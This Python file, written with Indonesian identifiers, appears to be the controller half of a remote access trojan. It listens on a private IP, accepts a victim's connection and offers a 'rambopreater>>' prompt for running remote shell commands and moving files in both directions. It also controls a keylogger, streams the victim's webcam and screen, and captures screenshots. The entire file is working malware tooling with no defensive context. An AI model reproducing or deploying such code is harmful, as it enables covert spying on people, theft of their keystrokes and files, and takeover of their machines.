# from ctypes.wintypes import tagRECT
# from json import dumps
import socket
import json
import os
import struct
import pickle
import threading
import cv2
from tkinter import Frame
from traceback import print_tb

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('192.168.168.58', 9999))
print('Menunggu koneksi ...')
soc.listen(1)

koneksi = soc.accept()
_target = koneksi[0]
ip = koneksi[1]
print(_target)
print(f'Terhubung ke {str(ip)}')


def data_diterima():
    data = ''
    while True:
        try:
            data = data + _target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(namafile):
    file = open(namafile, 'wb')
    _target.settimeout(1)
    _file = _target.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = _target.recv(1024)
        except socket.timeout as e:
            break
    _target.settimeout(None)
    file.close()


def upload_file(namafile):
    file = open(namafile, 'rb')
    _target.send(file.read())
    file.close()


def konversi_byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.168.58', 9998))
    sock.listen(5)
    koneksi = sock.accept()
    tg = koneksi[0]
    ip = koneksi[1]

    bdata = b""
    payload_size = struct.calcsize("Q")

    while True:
        while (len(bdata)) < payload_size:
            packet = tg.recv(4*1024)
            if not packet:
                break
            bdata += packet

        packed_msg_size = bdata[:payload_size]
        bdata = bdata[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        while len(bdata) < msg_size:
            bdata += tg.recv(4*1024)
        frame_data = bdata[:msg_size]
        bdata = bdata[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("Sedang Merekam ...", frame)
        key = cv2.waitKey(1)
        if key == 27:
            break
    tg.close()
    cv2.destroyAllWindows()


def stream_cam():
    t = threading.Thread(target=konversi_byte_stream)
    t.start()

def konversi_byte_screen_recorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.168.58', 9997))
    sock.listen(5)
    koneksi = sock.accept()
    tg = koneksi[0]
    ip = koneksi[1]

    bdata = b""
    payload_size = struct.calcsize("i")

    while True:
        while (len(bdata)) < payload_size:
            packet = tg.recv(1024)
            if not packet:
                break
            bdata += packet
        
        packed_msg_size = bdata[:payload_size]
        bdata = bdata[payload_size:]
        msg_size = struct.unpack("i", packed_msg_size)[0]
        while len(bdata) < msg_size:
            bdata += tg.recv(1024)
        frame_data = bdata[:msg_size]
        bdata = bdata[msg_size:]
        frame = pickle.loads(frame_data)
        cv2.imshow("Sedang Merekam Screen ...", frame)
        key = cv2.waitKey(1)
        if key == 27:
            break
    tg.close()
    cv2.destroyAllWindows()

def rekam_layar():
    t = threading.Thread(target=konversi_byte_screen_recorder)
    t.start

def komunikasi_sell():
    n = 0
    while True:
        perintah = input('rambopreater>>')
        data = json.dumps(perintah)
        _target.send(data.encode())
        if perintah in ('exit', 'quit'):
            break
        elif perintah == 'clear':
            os.system('clear')
        elif perintah[:3] == 'cd ':
            pass
        elif perintah[:8] == 'download':
            download_file(perintah[9:])
        elif perintah[:6] == 'upload':
            upload_file(perintah[7:])
        elif perintah == 'start_logger':
            pass
        elif perintah == 'baca_data':
            data = _target.recv(1024).decode()
            print(data)
        elif perintah == 'stop_logger':
            pass
        elif perintah == 'start_cam':
            stream_cam()
        elif perintah == 'screen_shot':
            n += 1
            file = open("ss" + str(n)+".png", 'wb')
            _target.settimeout(20)
            _file = _target.recv(1024)
            while _file:
                file.write(_file)
                try:
                    _file = _target.recv(1024)
                except socket.timeout as e:
                    break
            _target.settimeout(None)
            file.close()
        elif perintah == 'screen_share':
            rekam_layar()

        else:
            hasil = data_diterima()
            print(hasil)


komunikasi_sell()
